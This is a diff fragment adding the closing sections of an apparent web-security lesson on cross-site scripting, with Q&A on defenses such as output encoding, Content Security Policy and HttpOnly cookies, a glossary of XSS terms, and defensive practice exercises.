+Context-aware output encoding through auto-escaping templates or frameworks, safe DOM APIs like textContent, validating URLs, sanitizing any allowed HTML with a maintained library, and defense in depth with HttpOnly cookies and a strict Content Security Policy.
+</QA>
+
+<QA q="Why isn't input filtering enough?">
+Payloads have endless variations and encodings, and the same data may be used in different contexts. Encoding at output for the specific context is reliable; filtering is at most an extra layer.
+</QA>
+
+<QA q="How does CSP help against XSS?">
+It tells the browser which script sources are allowed. A strict policy without unsafe-inline blocks inline scripts and event handlers and scripts from other origins, so many injected payloads can't run even if markup is injected.
+</QA>
+
+<QA q="Does HttpOnly prevent XSS?">
+No. It only prevents scripts from reading the cookie. An XSS payload can still make requests as the user from the page, so it limits theft of the session, not the attack itself.
+</QA>
+
+</DeepDive>
+
+<DeepDive title="All key terms">
+
+<Terms>
+  <Term name="XSS">Script injection into pages viewed by others.</Term>
+  <Term name="Stored XSS">Payload saved and served to many users.</Term>
+  <Term name="Reflected XSS">Payload echoed from the current request.</Term>
+  <Term name="DOM-based XSS">Payload written to the DOM by client code.</Term>
+  <Term name="Payload">The injected attacker code.</Term>
+  <Term name="Sink">An API that interprets strings as code or markup.</Term>
+  <Term name="Source">Where untrusted data enters, like location.hash.</Term>
+  <Term name="Output encoding">Escaping data for its output context.</Term>
+  <Term name="Auto-escaping">Templates escaping output by default.</Term>
+  <Term name="Sanitization">Removing dangerous parts of HTML.</Term>
+  <Term name="DOMPurify">A widely used HTML sanitizer.</Term>
+  <Term name="HttpOnly">A cookie flag hiding it from JavaScript.</Term>
+  <Term name="CSP">A header restricting which scripts can run.</Term>
+  <Term name="Nonce">A per-response token allowing specific scripts.</Term>
+  <Term name="Trusted Types">A browser feature that locks down DOM sinks.</Term>
+</Terms>
+
+</DeepDive>
+
+<DeepDive title="More practice">
+
+1. Turn `attack.js` into a Playwright test suite that fails if any payload executes.
+2. Replace the hand-written HTML with a template engine (EJS with `<%= %>`) and confirm escaping.
+3. Add a nonce-based CSP to a page that needs one inline script.
+4. Render Markdown comments with marked + DOMPurify and test them with ten known payloads.
+5. Enable Trusted Types on a page and see which `innerHTML` calls the browser rejects.
+
+</DeepDive>
+
+Next: **Cross-Site Request Forgery (CSRF)**: tricking a logged-in browser into sending requests the user never intended.
